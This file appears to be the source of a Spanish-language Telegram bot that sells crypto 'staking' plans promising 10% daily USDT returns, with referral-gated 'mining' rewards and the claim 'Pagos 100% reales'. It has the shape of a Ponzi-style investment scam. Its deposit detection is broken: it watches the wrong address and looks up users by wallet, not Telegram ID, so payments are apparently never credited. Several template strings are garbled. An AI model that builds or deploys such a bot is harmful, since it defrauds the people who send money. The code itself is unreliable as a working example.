import 'dotenv/config'
import { Telegraf, Markup, session } from 'telegraf'
import { ethers } from 'ethers'
import fs from 'fs'

const bot = new Telegraf(process.env.TELEGRAM_TOKEN)
bot.use(session())

// DB
let users = {}
const DB_FILE = 'users.json'
if (fs.existsSync(DB_FILE)) users = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'))
const save = () => fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2))

// WEB3
const provider = new ethers.JsonRpcProvider(process.env.RPC_URL || "https://bsc-dataseed.binance.org/")
const signer = new ethers.Wallet(process.env.PRIVATE_KEY, provider)
const USDT = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", [
  "function transfer(address,uint256) external returns (bool)"
], signer)

const BOT_WALLET = process.env.WALLET_BOT || signer.address
const PLANES = {1:0.1,3:0.3,5:0.5,10:1.0,20:2.0,30:3.0,50:5.0}

// MENÚ
const teclado = Markup.keyboard([
  ['Staking', 'Minería'],
  ['Ganancias', 'Retiro'],
  ['Referidos', 'Soporte']
]).resize()

async function menu(ctx) {
  await ctx.reply("STANKING MINER\nPagos 100% reales · Mínimo 1 USDT", teclado)
}

// START + VERIFICACIÓN
bot.start(async ctx => {
  const id = ctx.from.id.toString()
  const ref = ctx.startPayload

  if (!users[id]) {
    const code = String(Math.floor(1000 + Math.random() * 9000))
    users[id] = { verified: false, code, balance: 0, planes: [], referidos: 0, ref_validos: 0, last_mine: 0, inviter: ref || null }
    save()
    await ctx.reply(`VERIFICACIÓN\nEscribe este código:\n\`${code}\``, { parse_mode: "Markdown" })
  } else if (!users[id].verified) {
    await ctx.reply(`Tu código:\n\`${users[id].code}\``, { parse_mode: "Markdown" })
  } else {
    menu(ctx)
  }
})

// VERIFICACIÓN + RETIRO
bot.on('text', async ctx => {
  const id = ctx.from.id.toString()
  const txt = ctx.message.text.trim()

  if (users[id] && !users[id].verified && txt === users[id].code) {
    users[id].verified = true
    delete users[id].code
    save()
    await ctx.reply("VERIFICADO ✓")
    return menu(ctx)
  }

  if (!users[id]?.verified) return

  if (ctx.session?.retiro) {
    if (!txt.match(/^0x[a-fA-F0-9]{40}$/i)) return ctx.reply("Wallet inválida")
    const bal = users[id].balance
    if (bal < 1) return ctx.reply("Mínimo 1 USDT")
    await ctx.reply("Enviando retiro...")
    try {
      const tx = await USDT.transfer(txt, ethers.parseUnits(bal.toString(), 18))
      await tx.wait()
      users[id].balance = 0
      save()
      await ctx.reply(`Retiro exitoso \( {bal.toFixed(3)} USDT\nhttps://bscscan.com/tx/ \){tx.hash}`)
    } catch (e) {
      await ctx.reply("Error: " + e.message.slice(0,100))
    }
    ctx.session.retiro = false
    return menu(ctx)
  }
})

// COMANDOS
bot.hears('Ganancias', ctx => ctx.reply(`Balance: ${(users[ctx.from.id]?.balance || 0).toFixed(3)} USDT`))

bot.hears('Retiro', ctx => {
  if ((users[ctx.from.id]?.balance || 0) < 1) return ctx.reply("Mínimo 1 USDT")
  ctx.reply("Envía tu wallet BEP-20:")
  ctx.session = { retiro: true }
})

bot.hears('Staking', ctx => ctx.reply("Elige plan:", Markup.inlineKeyboard([
  [Markup.button.callback("1 USDT", "p1"), Markup.button.callback("3 USDT", "p3")],
  [Markup.button.callback("5 USDT", "p5"), Markup.button.callback("10 USDT", "p10")],
  [Markup.button.callback("20 USDT", "p20"), Markup.button.callback("30 USDT", "p30")],
  [Markup.button.callback("50 USDT", "p50")]
])))

bot.hears('Minería', ctx => {
  const u = users[ctx.from.id]
  if (!u || u.ref_validos < 5) return ctx.reply(`Faltan ${5-(u?.ref_validos||0)} referidos válidos`)
  const ok = Date.now() - (u.last_mine || 0) >= 86400000
  ctx.reply(ok ? "¡RECLAMA 0.03 USDT!" : "Espera 24h", ok ? Markup.inlineKeyboard([[Markup.button.callback("RECLAMAR","mine")]]) : null)
})

bot.hears('Referidos', async ctx => {
  const me = await bot.telegram.getMe()
  const link = `https://t.me/\( {me.username}?start= \){ctx.from.id}`
  const u = users[ctx.from.id]
  ctx.replyWithMarkdown(`*Referidos*\nTotal: \( {u?.referidos||0}\nVálidos: \){u?.ref_validos||0}\n\nEnlace:\n${link}`)
})

bot.hears('Soporte', ctx => ctx.reply("@Carlo2187"))

// BOTONES (ARREGLADOS)
bot.action(/p(\d+)/, async ctx => {
  const monto = parseInt(ctx.match[1])
  await ctx.answerCbQuery()
  await ctx.replyWithMarkdown(`*Plan \( {monto} USDT*\n\nEnvía * \){monto} USDT* a:\n\`${BOT_WALLET}\`\n\nPago detectado automáticamente`)
})

bot.action('mine', async ctx => {
  const id = ctx.from.id.toString()
  if (Date.now() - (users[id].last_mine || 0) >= 86400000) {
    users[id].balance += 0.03
    users[id].last_mine = Date.now()
    save()
    await ctx.answerCbQuery("+0.03 USDT")
    ctx.reply("+0.03 USDT!")
  }
  menu(ctx)
})

// PAGOS AUTOMÁTICOS + GANANCIAS HORARIAS + KEEP-ALIVE
setInterval(() => console.log('KEEP-ALIVE - ' + new Date().toISOString()), 25000)

setInterval(() => {
  for (const id in users) {
    const u = users[id]
    if (u.planes?.length) {
      const daily = u.planes.reduce((s,p) => s + p.daily, 0)
      u.balance += daily
    }
  }
  save()
}, 3600000)

let last = 0
setInterval(async () => {
  try {
    const b = await provider.getBlockNumber()
    if (b <= last) return
    last = b
    const blk = await provider.getBlockWithTransactions(b)
    for (const tx of blk.transactions) {
      if (tx.to?.toLowerCase() === BOT_WALLET.toLowerCase() && tx.value.eq(0) && tx.data.startsWith("0xa9059cbb")) {
        const to = "0x" + tx.data.slice(34,74)
        const amt = Number(ethers.formatUnits("0x" + tx.data.slice(74),18))
        if ([1,3,5,10,20,30,50].includes(amt) && users[to]) {
          users[to].planes.push({amount:amt, daily:PLANES[amt], last_claim:Date.now()})
          if (users[to].inviter) users[users[to].inviter].ref_validos += 1
          save()
          bot.telegram.sendMessage(to, `Pago recibido \( {amt} USDT\nPlan + \){PLANES[amt]} USDT/día activado`).catch(()=>{})
        }
      }
    }
  } catch {}
}, 10000)

// LANZAMIENTO
bot.launch({ dropPendingUpdates: true })
  .then(() => console.log('BOT 100% VIVO Y COBRANDO 24/7'))
  .catch(e => console.error('ERROR:', e))

process.once('SIGINT', () => bot.stop())
process.once('SIGTERM', () => bot.stop())
